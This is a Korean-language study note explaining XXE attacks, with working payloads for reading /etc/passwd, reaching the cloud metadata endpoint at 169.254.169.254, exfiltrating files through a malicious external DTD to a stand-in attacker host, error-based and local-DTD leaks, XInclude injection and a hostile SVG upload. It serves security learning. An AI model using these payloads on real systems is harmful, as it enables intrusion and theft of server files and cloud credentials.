## XXE

XML 외부 엔티티 삽입 공격(XXE): 취약한 XML 파서가 신뢰할 수 없는 외부 엔티티 참조를 처리할때 발생하는 취약점

최근에는 거의 모든 언어와 XML 파서에서 XXE가 통하지 않도록 업데이트를 했음. 2021년 이후에는 OWASP Top 10에서도 빠질 정도로 XXE 공격이 줄어듦.

#### XXE 공격 가능성이 있는 곳

1. **파일 업로드 기능** (숨겨진 XML)
	- `.svg` (이미지 파일): `.svg` 이미지는 XML 코드로 그림을 그리는 방식임. 프로필 사진을 업로드할 때 악성 코드를 심은 SVG 파일을 올리면 서버가 이미지를 처리하다가 감염됨.
	- `.docx`, `.xlsx`, `.pptx` (MS 오피스 파일): MS 오피스 파일은 텍스트(XML), 폰트, 이미지 같은 문서의 부품을 ZIP 압축을 해둔 상태임. 파일의 확장자를 `.zip`으로 바꾸고 압축을 풀면 문서의 부품(XML)을 볼 수 있음. 이걸 이용해서 XXE 공격이 가능함.

2. **레거시 기업용 시스템**: 은행, 관공서, 대기업의 내부 시스템 중에는 10년~15년 전에 만들어져서 한 번도 업데이트되지 않은 구형 서버(SOAP API 등)들이 꽤 많음.

3. **B2B 로그인 연동** (SSO, SAML): 회사에서 '구글 계정으로 로그인', '사내 통합 로그인' 같은 기능을 쓸 때 내부적으로 **SAML**이라는 방식을 많이 쓰는데, 이게 XML 기반임. 

4. **개발자의 실수**: 개발하다가 "어? 왜 외부 데이터 연동이 안 되지?" 하고 구글링을 함. StackOverflow 같은 곳에서 10년 전 답변인 "이 코드를 넣어서 보안 옵션을 끄면 잘 작동합니다!"라는 글을 보고, 뜻도 모른 채 복사+붙여넣기를 해서 억지로 취약점을 부활시키는 경우도 종종 발생


### XML

데이터를 저장하고 다른 시스템끼리 쉽게 주고받기 위해 만든 확장 가능한 마크업 언어 
사용자가 직접 태그를 만들어 데이터를 구조화할 수 있는 점이 특징

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
    <book>
        <title>자바 이야기</title>
        <price>15000</price>
    </book>
</bookstore>
```

XML 문서 형식 정의(DTD): `DOCTYPE`를 통해서 XML 문서의 구조, 문서에 포함될 수 있는 데이터 값의 형식 및 기타 항목을 정의하는 선언을 할 수 있음.


#### XML 엔티티

XML에서 몇몇 특수 문자를 사용할때 문법 충돌을 막기 위해서 대체해서 사용하는 기호 
예: 작다는 뜻의 `<` 기호는 태그를 닫는 기호와 동일하므로 `&lt;` 사용

#### XML 사용자 정의 엔티티

``` xml
<?xml version="1.0" encoding="UTF-8"?>

<!-- 1.DTD에서 문서의 최상위 태그가 'foo'임을 선언하고, 사용할 엔티티를 정의 -->
<!DOCTYPE foo [ 
  <!ENTITY myentity "my entity value"> 
]>

<!-- 2. 실제 데이터의 시작. DTD에서 'foo'라고 선언했으므로 반드시 <foo>로 시작해야 함 -->
<foo>
  <content>여기에 &myentity;가 들어갑니다.</content>
</foo>
```
- DTD에서 정의할 수 있음. 
- 반복되는 긴 단어나 문장을 DTD에 한 번 선언해 두고, 본문에서는 짧게 불러다 쓰는 방식

#### XML 외부 엔티티

``` xml
<!DOCTYPE foo [ 
  <!-- ext라는 단축키를 치면, 저 txt 파일의 내용을 긁어오라고 선언 -->
  <!ENTITY ext SYSTEM "http://normal-website.com/notice.txt" > 
]>

<foo>
  <title>공지사항</title>
  <message>&ext;</message>
</foo>
```
- `SYSTEM` 키워드를 사용하여 **외부의 파일이나 URL 내용을 불러와 엔티티로 정의**함.
- `file://` 프로토콜도 사용 가능, 예: `file:///path/to/file`  
- 가져올 수 있는 것들
	- `<` 나 `&` 기호가 아예 없는 **순수한 일반 텍스트 파일**
	- 문법이 완벽하게 지켜진 **또 다른 XML 파일**
	- 모든 특수 기호가 `&lt;`나 `&amp;`로 변환되어 있는 텍스트

#### XML 파라미터 엔티티

``` xml
<!DOCTYPE foo [ 
  <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
  %xxe; 
]>
```
- DTD에서만 사용가능한 엔티티
- DTD에서 `%`를 붙여서 선언하고 `%xxe;` 등으로 사용
- 서버가 DTD를 읽는 순간, 본문까지 내려가지 않고 DTD 안에서 즉시 치환하고 실행
- **XML 파서들이 해커의 공격을 막기 위해 본문 태그에서  `&`나 수상한 글자를 차단하는 경우에 사용**


#### XML 인코딩

XML에서는 HTML과 마찬가지로 `<` 같은 특수 문자를 구문오류 없이 사용하기 위해서 XML 인코딩을 제공함. 서버의 XML 파서가 디코딩을 하기 때문에 보안 필터를 우회할 수 있음. 

``` xml 
<!-- XML 인코딩을 활용해 보안필터를 우회하는 SQLi 예시 -->
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```


### 파일 내용 추출

XXE 주입 공격을 통해 파일 내용을 가져올 수 있음. 
1. 파일의 경로를 포함한 외부 엔티티를 정의하는 `DOCTYPE`를 추가
2. XML에서 서버의 응답에서 그대로 다시 출력해주는 태그(예: `productId`)를 정의된 외부 엔티티로 수정

가정: 쇼핑 애플리케이션에서 서버에 다음과 같은 XML을 전송함으로써 특정 제품의 재고 상황을 확인함.
``` xml 
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

해커의 공격: 외부 엔티티를 이용해서 파일에 접근해 XXE 공격 시도
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
1. 서버의 XML 파서가 `&xxe`를 읽는 순간, `file:///etc/passwd` 파일의 내용을 가져와서 `productId`에 넣음. 
2. 서버에서 `productId`을 검증 및 조회하고 에러 발생시킴. 
3. 에러 메시지로 `productId`가 틀렸음을 알려줌. 
4. 해커는 해당 에러메시지로 `/etc/passwd`의 내용을 받음. 

응답
``` xml
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```



### SSRF 공격

XXE 주입 공격을 할때 서버 측 요청 위조(SSRF) 공격을 수행시킬 수 있음. 

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```


#### 참고: EC2 메타데이터 엔드포인트

AWS EC2(클라우드 서버)를 생성하면, 그 서버에는 기본적으로 **`169.254.169.254`라는 주소를 통해 접근할 수 있는 인스턴스 메타데이터 서비스(IMDS)** 가 자동으로 세팅되어 있음. 해당 주소는 서버 컴퓨터에서만 접근할 수 있음. 
AWS를 시작으로 관례처럼 됐기 때문에 다른 클라우드 서버에서도 `169.254.169.254`에서 서버에 대한 메타데이터를 얻을 수 있음. 


### 블라인드 XXE

XXE 공격은 가능하지만 응답 내용에 외부 요소들(파일 내용 등)의 값을 반환하지 않는 경우

#### 아웃오브밴드(OAST) 기법 사용

##### 외부 엔티티 사용

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
  <!ENTITY xxe SYSTEM "http://abcde.burpcollaborator.net"> 
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

##### 파라미터 엔티티 사용
 
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://abcde.burpcollaborator.net"> %xxe; ]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

##### 데이터 유출 방법

외부 엔티티 사용, 파라미터 엔티티 사용 방식은 XXE 공격이 성공했는지를 알 수는 있지만 민감한 데이터를 가져오거나 할 수는 없음. 

목표: `/etc/passwd` 파일 내용을 내 서버(OAST)의 접속 기록(HTTP URL의 쿼리 파라미터로)으로 가져오기

**문제점**
1. XML 파서는 규칙상 주소창 안에 곧바로 다른 변수(파라미터 엔티티인 `%file;` 등)를 조합하는 것을 허용하지 않음. 
	- 해결책: `%eval`변수를 통해서 변수를 만드는 코드를 문자로 포장
2. 변수 안에 변수를 조합하는 행위를 내부 DTD에서 금지함. 
	- 해결책: 외부 DTD 파일에서는 사용가능하므로, 외부 DTD에 코드를 작성하고 불러오면 됨. 

**공격**
1. **해커의 서버에서 외부 DTD를 만들어서 제공하도록 설정**, 예: `web-hacker.com/malicious.dtd`
	``` xml
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-hacker.com/?x=%file;'>">
	%eval;
	%exfiltrate;
	```
	- `&#x25;`: `%`기호를 16진수 HTML/XML 엔티티 코드로 인코딩한 것
		- `%`를 사용하는 경우: `eval` 변수를 정의하는 순간에 실행됨. 
		- `&#x25;`를 사용하는 경우: `%eval;`로 사용되는 순간에 실행됨. 
	
2. **공격할 서버에 해커의 외부 DTD를 가져오도록 하는 XXE 공격** 
	``` xml
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
	"http://web-hacker.com/malicious.dtd"> %xxe;]>
	```
	- XML 파서는 공격자의 서버에서 외부 DTD를 가져와서 그 내용을 그대로 해석하게 됨.
	- 서버에서 `http://web-hacker.com/?x=(/etc/passwd 파일내용)`을 전송해서 해커의 서버에 기록이 남음. 

참고: `/etc/passwd` 파일 내용에 줄바꿈 문자 같이 URL에 들어갈 수 없는 문자가 있으면 에러가 발생함. 
깐깐한 `http://...` 대신 `ftp://...`를 써보거나 줄바꿈이 없는 `/etc/hostname` 같은 파일만을 대상으로 하거나 **파일 전체를 Base64로 인코딩해서 빼돌린 후 복호화를 하는 방법**을 사용해야함.


#### 오류 메시지 이용

XML 파싱 오류를 유발하여 오류메시지에서 민감한 데이터를 얻을 수 있음. 웹 애플리케이션이 오류 메시지를 응답 데이터에 포함하여 반환해야함. 

1. 해커의 서버에서 외부 DTD를 만들어서 제공하도록 설정
``` xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- `/nonexistent` 경로를 넣어서 에러를 유도함. 

2. 공격할 서버에 해커의 외부 DTD를 가져오도록 하는 XXE 공격
``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://hacker.com"> %xxe;]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- 서버의 XML 파서가 해커의 외부 DTD를 가져와서 파싱하는 와중에 `/nonexistent`를 접근하게 되고 에러가 발생함. **그 에러메시지를 해커에게 제공하는데 거기에는 `/etc/passwd`의 내용이 들어있음.** 



#### 로컬 DTD를 활용

외부와의 통신이 차단되어 있어 외부 DTD 파일을 가져오는 것이 불가능한 경우에 해당 서버에 있는 로컬 DTD를 활용해 공격이 가능함. 

내부 DTD와 외부 DTD를 혼합해서 사용하는 경우, **내부 DTD는 외부 DTD에서 정의된 파라미터 엔티티들을 재정의**할 수 있음. 
이때, **다른 파라미터 엔티티의 정의 내에서 XML 파라미터 엔티티를 사용한 데 대한 제한이 완화됨.** 

``` xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
- 서버에 존재하는 로컬 DTD `docbookx.dtd`를 XML 파라미터 엔티티 `local_dtd`로 정의 
- **`docbookx.dtd`에 이미 정의되어있는 `ISOamso`를 재정의함으로써 XML 파서의 제한을 우회하고 `/etc/passwd` 파일 내용을 에러메시지로 보여주는 XXE 공격을 가능하도록 함.** 
- `%local_dtd;`로 사용할때 재정의된 `docbookx.dtd` 엔티티도 포함됨. 


##### 재정의할 로컬 DTD를 찾는 방법

1. 족보: DTD 파일을 사용하는 많은 시스템들이 오픈소스이기 때문에 인터넷 검색을 통해서 쉽게 정보를 얻을 수 있고 자주 사용하는 것들이 있음.
	- `/usr/share/yelp/dtd/docbookx.dtd`: 우분투 리눅스에 거의 무조건 있는 문서 뷰어 파일
	    - 사용하는 엔티티 이름: `ISOamso`
	- `/usr/share/xml/fontconfig/fonts.dtd`: 리눅스 폰트 설정 파일
	    - 사용하는 엔티티 이름: `constant`
	- `C:\Windows\System32\wbem\xml\cim20.dtd`: 윈도우 기본 파일
	    - 사용하는 엔티티 이름: `SuperClass`

2. 찔러보기: 먼저 해당 파일이 있는지 확인해볼 수 있음. 해당 파일이 없다면 오류가 발생할 것임. 
``` xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```



### XInclude 공격

HTTP 요청에서 XML 형식으로 데이터를 보내지 않는 경우도 있음.
이런 경우에는 `<!DOCTYPE>` 구문에 접근해서 외부 엔티티를 선언하는 등의 일반적인 XXE 공격은 통하지 않음. 이런 경우에 **XInclude 공격**을 사용해야함. 

##### SOAP 방식

주로 기업용 시스템에서 내부 컴퓨터끼리 데이터를 주고받을 때 사용하는 API 통신 방식 중 하나이며, **무조건 XML 형식으로만** 대화

1. 브라우저에서 `productId=1`을 서버로 보냄.
2. 웹 서버: 사용자의 요청을 받고, 백엔드 데이터베이스나 다른 서버에 물어보기 위해 **XML 요청을 직접 조립**
``` xml
<!-- 서버가 내부적으로 만드는 XML -->
<soapenv:Envelope>
   <soapenv:Body>
      <GetProductDetails>
	     <!-- 사용자가 보낸 값이 여기에 쏙 들어갑니다 -->
         <productId>1</productId> 
      </GetProductDetails>
   </soapenv:Body>
</soapenv:Envelope>
```
3. 백엔드 서버: 이 XML을 받아서 파싱(해석)하고 결과를 돌려줌.


##### XInclude 공격

XInclude: 다른 문서나 파일의 내용을 XML 문서 안으로 끼워 넣을 수 있는 XML의 기본 기능

``` xml
<!-- 네임스페이스 참조: XML 파서에게 지금부터 xi라는 태그는 XInclude 기능임을 선언 -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<!-- 파일 경로 지정 -->
	<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```


1. 해커가 `productId`값에 `1` 대신 XInclude 공격 코드를 넣어서 보냄. 
``` xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

2. 서버는 이 악성 코드를 그대로 받아서 SOAP XML 중간에 끼워 넣음.
``` xml
<!-- 서버가 내부적으로 만들어버린 악성 XML -->
<soapenv:Envelope>
   <soapenv:Body>
      <GetProductDetails>
         <productId>
            <!-- 공격자가 넣은 값이 그대로 삽입됨 -->
            <foo xmlns:xi="http://www.w3.org/2001/XInclude">
               <xi:include parse="text" href="file:///etc/passwd"/>
            </foo>
         </productId>
      </GetProductDetails>
   </soapenv:Body>
</soapenv:Envelope>
```

3. 백엔드 서버의 XML 파서가 `xi` 태그를 읽을 때 `/etc/passwd`의 내용을 가져와서 XML에 포함시킴. 운이 좋다면 화면에 에러 메시지나 결과값으로 확인 가능



### 파일 업로드를 통한 공격

웹사이트에 파일을 업로드할 수 있는 경우에 XXE 공격이 가능함. 
일반적으로 사용되는 파일 형식들은 XML을 사용하거나 XML 구성 요소를 포함하는 경우가 많음. 
예: `.docx`와 같은 오피스 문서, `.svg`와 같은 이미지 

**예시**
어떤 애플리케이션은 사용자가 이미지를 업로드할 수 있도록 허용하고, 업로드된 이미지들을 서버에서 처리하거나 검증할 수 있음. 애플리케이션이 PNG나 JPEG 형식의 이미지를 기대한다 하더라도, 사용되는 이미지 처리 라이브러리는 SVG 이미지도 처리할 수도 있음. SVG 형식은 XML을 사용하기 때문에, 공격자는 악의적인 SVG 이미지를 제출함으로써 XXE 취약점을 악용할 수 있음. 


``` xml
Content-Disposition: form-data; name="avatar"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
	<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
		<text font-size="20" x="10" y="20">&xxe;</text>
	</svg>
```
- `image/svg+xml` 사용
- `svg` 태그를 사용해야 SVG 파일로 인식이 됨. 
- 맨위 DTD에서 외부 엔티티를 선언하고 `text` 태그를 활용하여 결과를 보이도록 함. 


### Content-Type 조작을 통한 공격

대부분의 POST 요청은 HTML 폼에 의해 자동으로 생성되는 기본 콘텐츠 유형을 사용함. 
일부 웹사이트들은 이러한 형식의 요청만을 기대하지만, **개발자의 실수 같은 이유로 XML을 포함한 다른 콘텐츠 유형도 허용하는 경우**가 있음. 

만약 서버가 메시지 본문에 XML이 포함된 요청도 허용하고 그 내용을 XML 형식으로 해석한다면, 단순히 요청의 형식을 XML로 바꾸는 것만으로도 XXE 공격이 가능해짐.

``` http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

``` http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```


**최신 웹 프레임워크는 기본적으로 폼 데이터와 JSON 파서만 활성화되어 있음. XML 관련 라이브러리를 직접 추가하면 XML 파서가 작동하는 방식임.** 
그래서 다른 API나 레거시 시스템과 연동하기 위해서 XML 관련 라이브러리를 추가했다가 개발자도 모르게 XML 파서가 자동으로 적용이 될 가능성이 있음. 

